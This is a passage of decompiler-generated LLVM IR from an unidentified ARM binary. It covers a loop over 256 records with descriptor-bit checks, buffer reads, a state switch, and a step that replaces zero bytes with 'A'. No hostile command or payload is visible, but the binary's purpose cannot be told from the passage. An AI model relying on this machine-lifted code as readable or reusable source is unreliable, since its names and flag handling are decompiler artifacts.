  %v2_10b40 = icmp ugt i32 %v3_10b3c, 1
  store i1 %v2_10b40, i1* %cpsr_c.global-to-local, align 1
  %v7_10b40 = icmp eq i32 %v3_10b3c, 2
  store i1 %v7_10b40, i1* %cpsr_z.global-to-local, align 1
  %v2_10b44 = xor i1 %v2_10b40, true
  %v3_10b44 = or i1 %v7_10b40, %v2_10b44
  br i1 %v3_10b44, label %bb339, label %.thread239

.thread239:                                       ; preds = %dec_label_pc_10b34
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10b4c236240 = add i32 %v0_10b3c, 4
  %v3_10b4c237241 = inttoptr i32 %v2_10b4c236240 to i32*
  store i32 -1, i32* %v3_10b4c237241, align 4
  br label %bb340

bb339:                                            ; preds = %dec_label_pc_10b34
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10b4c233 = add i32 %v0_10b3c, 4
  %v3_10b4c234 = inttoptr i32 %v2_10b4c233 to i32*
  store i32 -1, i32* %v3_10b4c234, align 4
  %v4_10b50 = load i32, i32* %r3.global-to-local, align 4
  %v5_10b50 = load i32, i32* @r4, align 4
  %v6_10b50 = add i32 %v5_10b50, 12
  %v7_10b50 = inttoptr i32 %v6_10b50 to i32*
  store i32 %v4_10b50, i32* %v7_10b50, align 4
  %v4_10b54 = load i32, i32* %r3.global-to-local, align 4
  %v5_10b54 = trunc i32 %v4_10b54 to i8
  %v6_10b54 = load i32, i32* @r4, align 4
  %v7_10b54 = add i32 %v6_10b54, 284
  %v8_10b54 = inttoptr i32 %v7_10b54 to i8*
  store i8 %v5_10b54, i8* %v8_10b54, align 1
  %v0_10b58.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10b58.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb340

bb340:                                            ; preds = %.thread239, %bb339
  %v1_10b58 = phi i1 [ %v1_10b58.pre, %bb339 ], [ %v2_10b40, %.thread239 ]
  %v0_10b58 = phi i1 [ %v0_10b58.pre, %bb339 ], [ false, %.thread239 ]
  %v2_10b58 = xor i1 %v1_10b58, true
  %v3_10b58 = or i1 %v0_10b58, %v2_10b58
  br i1 %v3_10b58, label %bb334, label %dec_label_pc_10b5c

dec_label_pc_10b5c:                               ; preds = %bb340
  %v0_10b5c = load i32, i32* @r4, align 4
  %v1_10b5c = add i32 %v0_10b5c, 284
  %v2_10b5c = inttoptr i32 %v1_10b5c to i8*
  %v3_10b5c = load i8, i8* %v2_10b5c, align 1
  %v4_10b5c = zext i8 %v3_10b5c to i32
  %v1_10b60 = add nuw nsw i32 %v4_10b5c, 1
  %v1_10b64 = urem i32 %v1_10b60, 256
  store i32 %v1_10b64, i32* %r3.global-to-local, align 4
  %v2_10b68 = icmp ugt i32 %v1_10b64, 9
  store i1 %v2_10b68, i1* %cpsr_c.global-to-local, align 1
  %v7_10b68 = icmp eq i32 %v1_10b64, 10
  store i1 %v7_10b68, i1* %cpsr_z.global-to-local, align 1
  %v1_10b6c = trunc i32 %v1_10b60 to i8
  store i8 %v1_10b6c, i8* %v2_10b5c, align 1
  %v0_10b70 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10b70, label %.thread43, label %dec_label_pc_10b80

.thread43:                                        ; preds = %dec_label_pc_10b5c
  %v1_10b70 = load i32, i32* %r3.global-to-local, align 4
  %v2_10b70 = add i32 %v1_10b70, -10
  store i32 %v2_10b70, i32* %r3.global-to-local, align 4
  %v2_10b74 = load i32, i32* @r4, align 4
  %v3_10b74 = add i32 %v2_10b74, 12
  %v4_10b74 = inttoptr i32 %v3_10b74 to i32*
  store i32 %v2_10b70, i32* %v4_10b74, align 4
  %v1_10b78 = load i32, i32* %r3.global-to-local, align 4
  %v2_10b78 = trunc i32 %v1_10b78 to i8
  %v3_10b78 = load i32, i32* @r4, align 4
  %v4_10b78 = add i32 %v3_10b78, 284
  %v5_10b78 = inttoptr i32 %v4_10b78 to i8*
  store i8 %v2_10b78, i8* %v5_10b78, align 1
  %v0_10b7c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10b7c.pr.pr, label %bb334, label %dec_label_pc_10b80

dec_label_pc_10b80:                               ; preds = %dec_label_pc_10b5c, %.thread43
  %v0_10b80 = load i32, i32* @r4, align 4
  store i32 %v0_10b80, i32* @r0, align 4
  %v0_10b84 = call i32 @function_fdc0()
  store i32 %v0_10b84, i32* %r0.global-to-local, align 4
  br label %bb334

dec_label_pc_10b8c:                               ; preds = %dec_label_pc_10784
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_10b90 = call i32 @function_14898(i32 23)
  %v2_10b90 = trunc i32 %v1_10b90 to i16
  store i32 %v1_10b90, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223cc.215 to i32), i32* %r1.global-to-local, align 4
  br label %dec_label_pc_107f4

dec_label_pc_10ba0:                               ; preds = %bb334
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_10bac = load i32, i32* @r6, align 4
  %v1_10bac = load i32, i32* @r5, align 4
  %v3_10bac = icmp uge i32 %v0_10bac, %v1_10bac
  store i1 %v3_10bac, i1* %cpsr_c.global-to-local, align 1
  %v9_10bac = icmp eq i32 %v0_10bac, %v1_10bac
  store i1 %v9_10bac, i1* %cpsr_z.global-to-local, align 1
  %v5_10bb0 = icmp slt i32 %v0_10bac, %v1_10bac
  %storemerge106 = select i1 %v5_10bb0, i32 %v1_10bac, i32 %v0_10bac
  %v2_10bc4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_10bc4, i32* %ip.global-to-local, align 4
  %v2_10bc8 = ptrtoint i32* %stack_var_-224 to i32
  store i32 %v2_10bc8, i32* %r1.global-to-local, align 4
  %v2_10bcc = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_10bcc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10bd4 = add i32 %storemerge106, 1
  store i32 %v1_10bd4, i32* %r0.global-to-local, align 4
  %v5_10be0 = call i32 @function_14d24(i32 %v1_10bd4, i32 %v2_10bc8, i32 %v2_10bcc, i32 0, i32 %v2_10bc4)
  %v0_10be4 = load i32, i32* @r4, align 4
  store i32 %v0_10be4, i32* %r0.global-to-local, align 4
  %v1_10be8 = inttoptr i32 %v0_10be4 to i32*
  %v2_10be8 = call i32 @function_15b1c(i32* %v1_10be8)
  store i32 %v2_10be8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223e8.194 to i32), i32* @lr, align 4
  %v0_10bf0 = load i32, i32* @r4, align 4
  store i32 %v0_10bf0, i32* %stack_var_-52, align 4
  store i32 %v2_10be8, i32* @global_var_223e8.194, align 4
  %v2_11574 = ptrtoint i32* %stack_var_-45 to i32
  %v2_11588 = ptrtoint i32* %stack_var_-77 to i32
  %v3_1158c = bitcast i32* %stack_var_-45 to i16*
  %v3_1159c = bitcast i32* %stack_var_-77 to i16*
  %v2_11318 = ptrtoint i32* %stack_var_-60 to i32
  %v2_116b8 = ptrtoint i32* %stack_var_-104 to i32
  %v2_118f4 = ptrtoint i32* %stack_var_-96 to i32
  %v2_11920 = ptrtoint i32* %stack_var_-56 to i32
  %v2_1194c = ptrtoint i32* %stack_var_-42 to i32
  br label %dec_label_pc_10bf8

dec_label_pc_10bf8:                               ; preds = %dec_label_pc_10d7c, %dec_label_pc_10ba0
  %v0_10c04 = phi i32 [ %v1_10d80, %dec_label_pc_10d7c ], [ %v0_10bf0, %dec_label_pc_10ba0 ]
  store i32 ptrtoint (i32* @global_var_22978.205 to i32), i32* %r0.global-to-local, align 4
  %v3_10bfc = mul i32 %v0_10c04, 256
  store i32 %v3_10bfc, i32* %r3.global-to-local, align 4
  %v2_10c00 = load i32, i32* @global_var_22978.205, align 4
  store i32 %v2_10c00, i32* %r1.global-to-local, align 4
  %v2_10c08 = mul i32 %v0_10c04, 288
  store i32 %v2_10c08, i32* %r2.global-to-local, align 4
  %v2_10c0c = add i32 %v2_10c00, %v2_10c08
  store i32 %v2_10c0c, i32* @r6, align 4
  %v1_10c10 = add i32 %v2_10c0c, 4
  %v2_10c10 = inttoptr i32 %v1_10c10 to i32*
  %v3_10c10 = load i32, i32* %v2_10c10, align 4
  store i32 %v3_10c10, i32* %r0.global-to-local, align 4
  %v2_10c14 = icmp eq i32 %v3_10c10, -1
  store i1 %v2_10c14, i1* %cpsr_c.global-to-local, align 1
  %v7_10c14 = icmp eq i32 %v3_10c10, -1
  store i1 %v7_10c14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c14, label %dec_label_pc_10d7c, label %dec_label_pc_10c1c

dec_label_pc_10c1c:                               ; preds = %dec_label_pc_10bf8
  %v3_10c1c = udiv i32 %v3_10c10, 32
  store i32 %v2_119f0, i32* %r1.global-to-local, align 4
  %v3_10c24 = mul nuw nsw i32 %v3_10c1c, 4
  store i32 %v3_10c24, i32* %ip.global-to-local, align 4
  %v2_10c28 = add i32 %v3_10c24, %v2_119f0
  store i32 %v2_10c28, i32* %r2.global-to-local, align 4
  %v1_10c2c = add i32 %v2_10c28, -312
  %v2_10c2c = inttoptr i32 %v1_10c2c to i32*
  %v3_10c2c = load i32, i32* %v2_10c2c, align 4
  %v1_10c30 = urem i32 %v3_10c10, 32
  store i32 %v1_10c30, i32* %r1.global-to-local, align 4
  %v2_10c34 = add nsw i32 %v1_10c30, -1
  %v3_10c34 = shl i32 1, %v2_10c34
  %v4_10c34 = and i32 %v3_10c2c, %v3_10c34
  %v5_10c34 = icmp ne i32 %v4_10c34, 0
  store i1 %v5_10c34, i1* %cpsr_c.global-to-local, align 1
  %v6_10c34 = lshr i32 %v3_10c2c, %v1_10c30
  store i32 %v6_10c34, i32* %r3.global-to-local, align 4
  %v1_10c38 = urem i32 %v6_10c34, 2
  %v2_10c38 = icmp eq i32 %v1_10c38, 0
  store i1 %v2_10c38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10c38, label %dec_label_pc_10c40, label %dec_label_pc_117b0

dec_label_pc_10c40:                               ; preds = %dec_label_pc_10c1c, %dec_label_pc_1185c
  %v1_10c4c = phi i32 [ %v1_10c30, %dec_label_pc_10c1c ], [ %v1_10c4c.pre, %dec_label_pc_1185c ]
  %v0_10c44 = phi i32 [ %v3_10c24, %dec_label_pc_10c1c ], [ %v0_10c44.pre, %dec_label_pc_1185c ]
  store i32 %v2_119f0, i32* @lr, align 4
  %v2_10c44 = add i32 %v0_10c44, %v2_119f0
  store i32 %v2_10c44, i32* %r2.global-to-local, align 4
  %v1_10c48 = add i32 %v2_10c44, -184
  %v2_10c48 = inttoptr i32 %v1_10c48 to i32*
  %v3_10c48 = load i32, i32* %v2_10c48, align 4
  %v2_10c4c = add i32 %v1_10c4c, -1
  %v3_10c4c = shl i32 1, %v2_10c4c
  %v4_10c4c = and i32 %v3_10c48, %v3_10c4c
  %v5_10c4c = icmp ne i32 %v4_10c4c, 0
  store i1 %v5_10c4c, i1* %cpsr_c.global-to-local, align 1
  %v6_10c4c = lshr i32 %v3_10c48, %v1_10c4c
  store i32 %v6_10c4c, i32* %r3.global-to-local, align 4
  %v1_10c50 = urem i32 %v6_10c4c, 2
  %v2_10c50 = icmp eq i32 %v1_10c50, 0
  store i1 %v2_10c50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10c50, label %dec_label_pc_10d7c, label %dec_label_pc_10c58.preheader

dec_label_pc_10c58.preheader:                     ; preds = %dec_label_pc_10c40
  %v0_10c58127 = load i32, i32* @r6, align 4
  %v1_10c58128 = add i32 %v0_10c58127, 12
  %v2_10c58129 = inttoptr i32 %v1_10c58128 to i32*
  %v3_10c58130 = load i32, i32* %v2_10c58129, align 4
  store i32 %v3_10c58130, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10c5c126132 = icmp eq i32 %v3_10c58130, 0
  store i1 %v2_10c5c126132, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10c5c126132, label %dec_label_pc_10d7c, label %dec_label_pc_10c64.lr.ph

dec_label_pc_10c58.loopexit:                      ; preds = %dec_label_pc_1165c, %dec_label_pc_11478, %dec_label_pc_11400, %dec_label_pc_119c0
  %v0_10c58 = load i32, i32* @r6, align 4
  %v1_10c58 = add i32 %v0_10c58, 12
  %v2_10c58 = inttoptr i32 %v1_10c58 to i32*
  %v3_10c58 = load i32, i32* %v2_10c58, align 4
  store i32 %v3_10c58, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10c5c126 = icmp eq i32 %v3_10c58, 0
  store i1 %v2_10c5c126, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10c5c126, label %dec_label_pc_10d7c, label %dec_label_pc_10c64.lr.ph

dec_label_pc_10c64.lr.ph:                         ; preds = %dec_label_pc_10c58.preheader, %dec_label_pc_10c58.loopexit
  %v0_10c64158 = phi i32 [ %v0_10c58, %dec_label_pc_10c58.loopexit ], [ %v0_10c58127, %dec_label_pc_10c58.preheader ]
  br label %dec_label_pc_10c64

dec_label_pc_10c5cthread-pre-split.thread:        ; preds = %dec_label_pc_10e34, %dec_label_pc_10f08, %dec_label_pc_110e4, %dec_label_pc_111b8, %dec_label_pc_1128c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10c64

dec_label_pc_10c5cthread-pre-split.thread477:     ; preds = %dec_label_pc_112f0, %dec_label_pc_11148, %dec_label_pc_10f6c, %dec_label_pc_1121c, %dec_label_pc_10e98
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10c64

dec_label_pc_10c5cthread-pre-split:               ; preds = %dec_label_pc_10cdc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10c5c = icmp eq i32 %v3_10cdc, 0
  store i1 %v2_10c5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10c5c, label %dec_label_pc_10d7c, label %dec_label_pc_10c64

dec_label_pc_10c64:                               ; preds = %dec_label_pc_10c5cthread-pre-split.thread, %dec_label_pc_10c5cthread-pre-split, %dec_label_pc_10c5cthread-pre-split.thread477, %dec_label_pc_10c64.lr.ph
  %v0_1175c = phi i32 [ %v0_10c64158, %dec_label_pc_10c64.lr.ph ], [ %v0_10cdc, %dec_label_pc_10c5cthread-pre-split.thread477 ], [ %v0_10cdc, %dec_label_pc_10c5cthread-pre-split ], [ %v0_10cdc, %dec_label_pc_10c5cthread-pre-split.thread ]
  %v1_10c64 = add i32 %v0_1175c, 24
  %v2_10c64 = inttoptr i32 %v1_10c64 to i32*
  %v3_10c64 = load i32, i32* %v2_10c64, align 4
  store i32 %v3_10c64, i32* %r3.global-to-local, align 4
  %v2_10c68 = icmp ugt i32 %v3_10c64, 255
  store i1 %v2_10c68, i1* %cpsr_c.global-to-local, align 1
  %v7_10c68 = icmp eq i32 %v3_10c64, 256
  store i1 %v7_10c68, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_1175c, 28
  store i32 %.pre, i32* @fp, align 4
  br i1 %v7_10c68, label %dec_label_pc_1175c, label %dec_label_pc_10c74

dec_label_pc_10c74:                               ; preds = %dec_label_pc_10c64, %dec_label_pc_1175c
  %v0_10c74 = call i32 @function_12f18()
  store i32 %v0_10c74, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v2_10c7c = inttoptr i32 %v0_10c74 to i32*
  store i32 0, i32* %v2_10c7c, align 4
  %v0_10c80 = load i32, i32* @r6, align 4
  %v1_10c80 = add i32 %v0_10c80, 24
  %v2_10c80 = inttoptr i32 %v1_10c80 to i32*
  %v3_10c80 = load i32, i32* %v2_10c80, align 4
  store i32 %v3_10c80, i32* %r2.global-to-local, align 4
  %v0_10c84 = load i32, i32* @fp, align 4
  %v2_10c84 = add i32 %v0_10c84, %v3_10c80
  store i32 %v2_10c84, i32* @r4, align 4
  %v1_10c88 = add i32 %v0_10c80, 4
  %v2_10c88 = inttoptr i32 %v1_10c88 to i32*
  %v3_10c88 = load i32, i32* %v2_10c88, align 4
  store i32 %v3_10c88, i32* @r0, align 4
  %v1_10c8c = sub i32 256, %v3_10c80
  store i32 %v1_10c8c, i32* @r2, align 4
  store i32 %v2_10c84, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10c98 = call i32 @function_14a54(i32 %v3_10c88, i32 %v2_10c84, i32 %v1_10c8c, i32 16384)
  store i32 %v4_10c98, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10c9c = icmp eq i32 %v4_10c98, 0
  store i1 %v2_10c9c, i1* %cpsr_z.global-to-local, align 1
  %tmp341 = icmp slt i32 %v4_10c98, 1
  br i1 %tmp341, label %dec_label_pc_1174c, label %dec_label_pc_10ca4

dec_label_pc_10ca4:                               ; preds = %dec_label_pc_10c74
  %v0_10ca4 = load i32, i32* @r5, align 4
  store i32 %v0_10ca4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10ca8

dec_label_pc_10ca8:                               ; preds = %.thread50, %dec_label_pc_10ca4
  %v3_10cb4 = phi i32 [ %v1_10cb8, %.thread50 ], [ %v0_10ca4, %dec_label_pc_10ca4 ]
  %v1_10ca8 = load i32, i32* @r4, align 4
  %v2_10ca8 = add i32 %v1_10ca8, %v3_10cb4
  %v3_10ca8 = inttoptr i32 %v2_10ca8 to i8*
  %v4_10ca8 = load i8, i8* %v3_10ca8, align 1
  %v6_10ca8 = zext i8 %v4_10ca8 to i32
  store i32 %v6_10ca8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10cac = icmp eq i8 %v4_10ca8, 0
  store i1 %v2_10cac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10cac, label %bb342, label %.thread50

bb342:                                            ; preds = %dec_label_pc_10ca8
  %v2_10cb0 = add nuw nsw i32 %v6_10ca8, 65
  store i32 %v2_10cb0, i32* %r3.global-to-local, align 4
  %v2_10cb4 = trunc i32 %v2_10cb0 to i8
  store i8 %v2_10cb4, i8* %v3_10ca8, align 1
  %v0_10cb8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread50

.thread50:                                        ; preds = %dec_label_pc_10ca8, %bb342
  %v0_10cb8 = phi i32 [ %v3_10cb4, %dec_label_pc_10ca8 ], [ %v0_10cb8.pre, %bb342 ]
  %v1_10cb8 = add i32 %v0_10cb8, 1
  store i32 %v1_10cb8, i32* %r2.global-to-local, align 4
  %v3_10cbc = icmp uge i32 %v1_10cb8, %v4_10c98
  store i1 %v3_10cbc, i1* %cpsr_c.global-to-local, align 1
  %v9_10cbc = icmp eq i32 %v1_10cb8, %v4_10c98
  store i1 %v9_10cbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10cbc, label %dec_label_pc_10cc4, label %dec_label_pc_10ca8

dec_label_pc_10cc4:                               ; preds = %.thread50, %dec_label_pc_11750
  store i32 ptrtoint (i32* @global_var_223e8.194 to i32), i32* %r1.global-to-local, align 4
  %v0_10cc8 = load i32, i32* @r6, align 4
  %v1_10cc8 = add i32 %v0_10cc8, 24
  %v2_10cc8 = inttoptr i32 %v1_10cc8 to i32*
  %v3_10cc8 = load i32, i32* %v2_10cc8, align 4
  %v2_10ccc = load i32, i32* @global_var_223e8.194, align 4
  store i32 %v2_10ccc, i32* %r2.global-to-local, align 4
  %v2_10cd0 = add i32 %v3_10cc8, %v4_10c98
  store i32 %v2_10cd0, i32* %r3.global-to-local, align 4
  store i32 %v2_10cd0, i32* %v2_10cc8, align 4
  %v0_10cd8 = load i32, i32* %r2.global-to-local, align 4
  %v1_10cd8 = load i32, i32* @r6, align 4
  %v2_10cd8 = add i32 %v1_10cd8, 8
  %v3_10cd8 = inttoptr i32 %v2_10cd8 to i32*
  store i32 %v0_10cd8, i32* %v3_10cd8, align 4
  br label %dec_label_pc_10cdc

dec_label_pc_10cdc:                               ; preds = %dec_label_pc_10e0c, %dec_label_pc_10cc4
  %v0_10cdc = load i32, i32* @r6, align 4
  %v1_10cdc = add i32 %v0_10cdc, 12
  %v2_10cdc = inttoptr i32 %v1_10cdc to i32*
  %v3_10cdc = load i32, i32* %v2_10cdc, align 4
  store i32 %v3_10cdc, i32* %r0.global-to-local, align 4
  %v1_10ce0 = add i32 %v3_10cdc, -2
  store i32 %v1_10ce0, i32* %r3.global-to-local, align 4
  %v7_10ce4 = icmp eq i32 %v1_10ce0, 8
  store i1 %v7_10ce4, i1* %cpsr_z.global-to-local, align 1
  %v5_10ce8 = and i32 %v1_10ce0, 1073741824
  %v6_10ce8 = icmp ne i32 %v5_10ce8, 0
  store i1 %v6_10ce8, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_10cdc, label %dec_label_pc_10c5cthread-pre-split [
    i32 2, label %dec_label_pc_114a0
    i32 3, label %dec_label_pc_11360
    i32 4, label %dec_label_pc_1140c
    i32 5, label %dec_label_pc_1128c
    i32 6, label %dec_label_pc_110e4
    i32 7, label %dec_label_pc_10f08
    i32 8, label %dec_label_pc_111b8
    i32 9, label %dec_label_pc_10e34
    i32 10, label %dec_label_pc_10d94
  ]

dec_label_pc_10d14:                               ; preds = %dec_label_pc_1174c
  %v0_10d14 = call i32 @function_12f18()
  store i32 %v0_10d14, i32* %r0.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  %v2_10d1c = inttoptr i32 %v0_10d14 to i32*
  store i32 104, i32* %v2_10d1c, align 4
  br label %dec_label_pc_10d20

dec_label_pc_10d20:                               ; preds = %dec_label_pc_11750, %dec_label_pc_10d14
  %v0_10d20 = call i32 @function_12f18()
  store i32 %v0_10d20, i32* %r0.global-to-local, align 4
  %v1_10d24 = inttoptr i32 %v0_10d20 to i32*
  %v2_10d24 = load i32, i32* %v1_10d24, align 4
  store i32 %v2_10d24, i32* %r3.global-to-local, align 4
  %v2_10d28 = icmp ugt i32 %v2_10d24, 10
  store i1 %v2_10d28, i1* %cpsr_c.global-to-local, align 1
  %v7_10d28 = icmp eq i32 %v2_10d24, 11
  store i1 %v7_10d28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d28, label %dec_label_pc_10d7c, label %dec_label_pc_10d30

dec_label_pc_10d30:                               ; preds = %dec_label_pc_10d20
  %v0_10d30 = call i32 @function_12f18()
  store i32 %v0_10d30, i32* %r0.global-to-local, align 4
  %v1_10d34 = inttoptr i32 %v0_10d30 to i32*
  %v2_10d34 = load i32, i32* %v1_10d34, align 4
  store i32 %v2_10d34, i32* %r3.global-to-local, align 4
  %v2_10d38 = icmp ugt i32 %v2_10d34, 10
  store i1 %v2_10d38, i1* %cpsr_c.global-to-local, align 1
  %v7_10d38 = icmp eq i32 %v2_10d34, 11
  store i1 %v7_10d38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d38, label %dec_label_pc_10d7c, label %dec_label_pc_10d40

dec_label_pc_10d40:                               ; preds = %dec_label_pc_10d30
  %v0_10d40 = load i32, i32* @r6, align 4
  %v1_10d40 = add i32 %v0_10d40, 4
  %v2_10d40 = inttoptr i32 %v1_10d40 to i32*
  %v3_10d40 = load i32, i32* %v2_10d40, align 4
  store i32 %v3_10d40, i32* @r0, align 4
  %v1_10d44 = call i32 @function_15b6c(i32 %v3_10d40)
  store i32 %v1_10d44, i32* %r0.global-to-local, align 4
  %v0_10d48 = load i32, i32* @r6, align 4
  %v1_10d48 = add i32 %v0_10d48, 284
  %v2_10d48 = inttoptr i32 %v1_10d48 to i8*
  %v3_10d48 = load i8, i8* %v2_10d48, align 1
  %v4_10d48 = zext i8 %v3_10d48 to i32
  %v1_10d4c = add nuw nsw i32 %v4_10d48, 1
  %v1_10d50 = urem i32 %v1_10d4c, 256
  store i32 %v1_10d50, i32* %r3.global-to-local, align 4
  %v2_10d54 = icmp ugt i32 %v1_10d50, 8
  store i1 %v2_10d54, i1* %cpsr_c.global-to-local, align 1
  %v7_10d54 = icmp eq i32 %v1_10d50, 9
  store i1 %v7_10d54, i1* %cpsr_z.global-to-local, align 1
  %v1_10d58 = trunc i32 %v1_10d4c to i8
  store i8 %v1_10d58, i8* %v2_10d48, align 1
  %v0_10d5c = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_10d5c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_10d5c = xor i1 %v1_10d5c, true
  %v3_10d5c = and i1 %v0_10d5c, %v2_10d5c
  br i1 %v3_10d5c, label %bb343, label %.thread255

.thread255:                                       ; preds = %dec_label_pc_10d40
  store i32 -1, i32* %r2.global-to-local, align 4
  %v1_10d68251256 = load i32, i32* @r6, align 4
  %v2_10d68252257 = add i32 %v1_10d68251256, 4
  %v3_10d68253258 = inttoptr i32 %v2_10d68252257 to i32*
  store i32 -1, i32* %v3_10d68253258, align 4
  br label %bb344

bb343:                                            ; preds = %dec_label_pc_10d40
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10d68247 = load i32, i32* @r6, align 4
  %v2_10d68248 = add i32 %v1_10d68247, 4
  %v3_10d68249 = inttoptr i32 %v2_10d68248 to i32*
  store i32 -1, i32* %v3_10d68249, align 4
  %v4_10d6c = load i32, i32* %r0.global-to-local, align 4
  %v5_10d6c = load i32, i32* @r6, align 4
  %v6_10d6c = add i32 %v5_10d6c, 12
  %v7_10d6c = inttoptr i32 %v6_10d6c to i32*
  store i32 %v4_10d6c, i32* %v7_10d6c, align 4
  %v4_10d70 = load i32, i32* %r3.global-to-local, align 4
  %v5_10d70 = trunc i32 %v4_10d70 to i8
  %v6_10d70 = load i32, i32* @r6, align 4
  %v7_10d70 = add i32 %v6_10d70, 284
  %v8_10d70 = inttoptr i32 %v7_10d70 to i8*
  store i8 %v5_10d70, i8* %v8_10d70, align 1
  %v0_10d74.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10d74.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb344

bb344:                                            ; preds = %.thread255, %bb343
  %v1_10d78 = phi i1 [ %v1_10d74.pre, %bb343 ], [ %v0_10d5c, %.thread255 ]
  %v0_10d78 = phi i1 [ %v0_10d74.pre, %bb343 ], [ %v1_10d5c, %.thread255 ]
  %v2_10d74 = xor i1 %v1_10d78, true
  %v3_10d74 = or i1 %v0_10d78, %v2_10d74
  br i1 %v3_10d74, label %bb345, label %bb346

bb345:                                            ; preds = %bb344
  %v4_10d74 = load i32, i32* @r6, align 4
  store i32 %v4_10d74, i32* %r0.global-to-local, align 4
  br label %bb346

bb346:                                            ; preds = %bb344, %bb345
  store i32 68988, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10d74, i32 ptrtoint (i32* @global_var_fdc0.325 to i32))
  br label %dec_label_pc_10d7c

dec_label_pc_10d7c:                               ; preds = %dec_label_pc_10c58.loopexit, %dec_label_pc_10c5cthread-pre-split, %dec_label_pc_10c58.preheader, %dec_label_pc_10d30, %dec_label_pc_10d20, %dec_label_pc_10c40, %dec_label_pc_10bf8, %dec_label_pc_1187c, %bb346
  %v3_10d7c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10d7c, i32* %r3.global-to-local, align 4
  %v1_10d80 = add i32 %v3_10d7c, 1
  store i32 %v1_10d80, i32* @r4, align 4
  %v2_10d84 = icmp ugt i32 %v1_10d80, 254
  store i1 %v2_10d84, i1* %cpsr_c.global-to-local, align 1
  %v7_10d84 = icmp eq i32 %v1_10d80, 255
  store i1 %v7_10d84, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10d80, i32* %stack_var_-52, align 4
  %v7_10d8c = icmp slt i32 %v1_10d80, 256
  br i1 %v7_10d8c, label %dec_label_pc_10bf8, label %dec_label_pc_1060c

dec_label_pc_10d94:                               ; preds = %dec_label_pc_10cdc
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_10d98 = call i32 @function_11ad8(i32 26)
  store i32 %v2_11318, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_10da8 = call i32 @function_11a14(i32 26, i32* nonnull %stack_var_-60)
  %v3_10dac = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10da8, i32* %r2.global-to-local, align 4
  %v1_10db4 = add i32 %v3_10dac, -1
  store i32 %v1_10db4, i32* %r3.global-to-local, align 4
  %v0_10db8 = load i32, i32* @fp, align 4
  store i32 %v0_10db8, i32* %r0.global-to-local, align 4
  %v0_10dbc = load i32, i32* @r6, align 4
  %v1_10dbc = add i32 %v0_10dbc, 24
  %v2_10dbc = inttoptr i32 %v1_10dbc to i32*
  %v3_10dbc = load i32, i32* %v2_10dbc, align 4
  store i32 %v3_10dbc, i32* %r1.global-to-local, align 4
  %v4_10dc0 = call i32 @function_12428(i32 %v0_10db8, i32 %v3_10dbc, i32 %v3_10da8, i32 %v1_10db4)
  %v2_10dc4 = icmp eq i32 %v4_10dc0, -1
  store i1 %v2_10dc4, i1* %cpsr_c.global-to-local, align 1
  %v7_10dc4 = icmp eq i32 %v4_10dc0, -1
  store i1 %v7_10dc4, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_11660 = call i32 @function_11a38(i32 26)
  br i1 %v7_10dc4, label %dec_label_pc_1165c, label %dec_label_pc_10dcc

dec_label_pc_10dcc:                               ; preds = %dec_label_pc_10d94
  store i32 %v1_11660, i32* %r0.global-to-local, align 4
  %v0_10dd4 = load i32, i32* @r6, align 4
  %v1_10dd4 = add i32 %v0_10dd4, 4
